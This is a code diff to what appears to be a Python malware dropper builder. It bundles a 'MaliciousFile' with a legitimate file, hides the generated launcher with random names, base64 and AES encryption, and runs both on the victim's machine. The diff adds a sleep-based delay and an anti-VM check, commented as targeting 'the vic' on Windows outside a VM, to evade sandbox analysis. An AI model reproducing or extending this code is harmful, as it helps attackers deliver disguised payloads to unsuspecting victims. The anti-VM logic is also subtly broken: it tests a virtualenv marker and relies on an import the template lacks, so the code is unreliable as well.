@@ -30,7 +30,7 @@ def randVar():
         random.choice("0123456789") for x in range(3))
 
 
-def main(MaliciousFile, LegitFile, OutputFile, ExtractDir, EncryptCheckBox):
+def main(MaliciousFile, LegitFile, OutputFile, ExtractDir, EncryptCheckBox, delay_option="False", antivm_option="False", delay_time=0):
 
     BLOCK_SIZE, PADDING = 32, '{'
     pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
@@ -40,7 +40,7 @@ def main(MaliciousFile, LegitFile, OutputFile, ExtractDir, EncryptCheckBox):
     cipherEnc = AES.new(key)
     bd64var, AESvar = randVar(), randVar()
     myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar),
-                 'from base64 import b64decode as %s' % (bd64var), 'import os']
+                 'from base64 import b64decode as %s' % (bd64var), 'import os', 'from time import sleep']
     myendings.append('from hashlib import sha256')
 
     try:
@@ -58,7 +58,16 @@ filename = "%s"
 content = "%s"
 filename2 = "%s"
 content2 = "%s"
-
+delay_option = %s
+antivm_option = %s
+delay_time = %d
+if delay_option:
+    sleep(delay_time)
+if antivm_option:
+    if os.name == 'nt' and hasattr(sys, 'real_prefix'):  # Ensures the vic is Windows and Not a VM
+        pass
+    else:
+        sys.exit()
 fullpath = pathto + os.sep + filename
 fullpath2 = pathto + os.sep + filename2
 
@@ -84,7 +93,7 @@ except:
 os.startfile(fullpath)
 os.startfile(fullpath2)
 ''' % (path_update, MaliciousFile.split(os.sep)[-1], mexe.replace('\n', ''), LegitFile.split(os.sep)[-1],
-       iexe.replace('\n', ''))
+       iexe.replace('\n', ''), delay_option, antivm_option, delay_time)
     except:
         return False
     encrypted = EncodeAES(cipherEnc, template)
